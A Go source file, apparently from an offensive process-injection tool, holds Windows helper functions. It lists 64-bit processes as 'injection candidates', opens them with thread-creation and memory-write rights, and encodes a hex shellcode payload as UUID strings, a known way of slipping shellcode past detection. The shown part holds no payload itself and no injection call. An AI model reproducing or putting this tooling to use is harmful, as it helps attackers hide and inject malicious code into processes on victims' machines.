package inject

import (
	"debug/pe"
	"encoding/hex"
	"fmt"
	"math/rand"
	"os"
	"unicode/utf16"

	"github.com/gofrs/uuid"
	"golang.org/x/sys/windows"
)

func SelectRandomElement(array []uint32) int {
	randomIndex := rand.Intn(len(array))
	chosen := array[randomIndex]
	return int(chosen)
}

func Get64BitProcesses() []uint32 {
	processes, cbNeeded := EnumProcesses()

	var candidates []uint32
	for i := 0; i < int(cbNeeded); i++ {
		pid := processes[i]
		if pid == 0 && i > 0 {
			break
		} else if pid != uint32(os.Getpid()) {
			bitness := Is64Bit(pid)
			if bitness == 0 {
				candidates = append(candidates, pid)
			}
		}
	}
	fmt.Printf("\n[+] Number of process injection candidates: %d", len(candidates))
	return candidates
}

func Is64Bit(pid uint32) int {
	pHandle, err := OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, 0, pid)
	if err.Error() == "The operation completed successfully." {
		bitness := IsWow64Process(pHandle)
		CloseHandle(pHandle)
		return int(bitness)

	} else {
		CloseHandle(pHandle)
		return -1
	}
}

func StringToCharPtr(str string) *uint8 {
	chars := append([]byte(str), 0) // null terminated
	return &chars[0]
}

func StringToUTF16Ptr(str string) *uint16 {
	wchars := utf16.Encode([]rune(str + "\x00"))
	return &wchars[0]
}

// SplitToWords - Splits a slice into multiple slices based on word length.
func SplitToWords(array []byte, wordLen int, pad_incomplete bool) [][]byte {
	words := [][]byte{}
	for i := 0; i < len(array); i += wordLen {
		word := array[i : i+wordLen]

		if pad_incomplete && len(word) < wordLen {
			for j := len(word); j < len(word); j++ {
				word = append(word, 0)
			}
		}
		words = append(words, word)
	}
	return words
}

// SwapEndianness - Heavily inspired by code from CyberChef https://github.com/gchq/CyberChef/blob/c9d9730726dfa16a1c5f37024ba9c7ea9f37453d/src/core/operations/SwapEndianness.mjs
func SwapEndianness(array []byte, word_len int, pad_incomplete bool) []byte {

	// Split into words.
	words := SplitToWords(array, word_len, pad_incomplete)

	// Rejoin into single slice.
	result := []byte{}
	for i := 0; i < len(words); i++ {
		for k := len(words[i]) - 1; k >= 0; k-- {
			result = append(result, words[i][k])
		}
	}
	return result
}

// ConvertToUUIDS - converts a hex payload to a slice of UUID strings.
func ConvertToUUIDS(payload string) []string {
	uuids := []string{}
	sc, _ := hex.DecodeString(payload)

	for i := 0; i < len(sc); i += 16 {
		leBytes1 := SwapEndianness([]byte(sc)[i:i+4], 4, false)
		leBytes2 := SwapEndianness([]byte(sc)[i+4:i+8], 4, false)
		leBytes3 := append(leBytes2[2:4], leBytes2[0:2]...)
		leBytes := append(leBytes1, leBytes3...)
		leBytes = append(leBytes, []byte(sc)[i+8:i+16]...)
		uuid, err := uuid.FromBytes(leBytes)
		if err != nil {
			fmt.Println(err)
		}
		uuids = append(uuids, uuid.String())
	}

	return uuids
}

// findRelocSec
func findRelocSec(va uint32, secs []*pe.Section) *pe.Section {
	for _, sec := range secs {
		if sec.VirtualAddress == va {
			return sec
		}
	}
	return nil
}
